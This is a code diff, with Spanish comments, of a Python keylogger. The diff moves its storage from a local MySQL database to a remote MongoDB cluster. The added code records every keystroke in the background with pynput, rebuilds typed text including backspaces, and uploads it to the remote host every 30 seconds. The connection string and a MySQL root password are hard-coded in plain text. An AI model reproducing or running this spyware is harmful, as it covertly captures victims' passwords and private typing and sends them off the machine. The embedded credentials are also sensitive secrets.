@@ -1,36 +1,39 @@
-import mysql.connector
 import threading
 import time
 from pynput import keyboard
+from pymongo import MongoClient
 
-# Configuración de la conexión a la base de datos MySQL
-db_config = {
-    'user': 'root',            # Reemplaza con tu usuario de MySQL
-    'password': 'proalafalda',      # Reemplaza con tu contraseña de MySQL
-    'host': '127.0.0.1',              # O la IP de tu servidor MySQL
-    'database': 'keylogger_db'        # El nombre de la base de datos que creaste
-}
-
-# Conexión a la base de datos
-conn = mysql.connector.connect(**db_config)
-cursor = conn.cursor()
+# Conexión a MongoDB
+mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
+client = MongoClient(mongo_uri)
+db = client["keylogger_db"]       # Nombre de la base de datos
+collection = db["keystrokes"]     # Nombre de la colección
 
 # Lista para almacenar las teclas pulsadas
 keystrokes = []
 
 def on_press(key):
     try:
-        keystrokes.append(str(key.char))
+        keystrokes.append(key.char)
     except AttributeError:
-        keystrokes.append(str(key))
+        # Maneja teclas especiales
+        if key == keyboard.Key.space:
+            keystrokes.append(' ')
+        elif key == keyboard.Key.enter:
+            keystrokes.append('\n')
+        elif key == keyboard.Key.tab:
+            keystrokes.append('\t')
+        elif key == keyboard.Key.backspace and keystrokes:
+            keystrokes.pop()  # Eliminar la última tecla registrada en caso de backspace
 
 def store_keystrokes():
     while True:
-        time.sleep(10)  # Espera 9 minutos - 540
+        time.sleep(30)  # Espera 5 minutos (300 segundos)
         if keystrokes:
-            sql = "INSERT INTO keystrokes (`key`) VALUES (%s)"
-            cursor.executemany(sql, [(k,) for k in keystrokes])
-            conn.commit()
+            # Unir las teclas en una sola cadena de texto
+            data = ''.join(keystrokes)
+            # Insertar en la colección
+            collection.insert_one({"text": data})
             keystrokes.clear()  # Limpiar la lista después de almacenarla
 
 # Iniciar el hilo de almacenamiento en segundo plano
@@ -41,6 +44,3 @@ store_thread.start()
 # Escuchar las teclas en segundo plano
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
-
-# Cerrar la conexión a la base de datos al terminar
-conn.close()
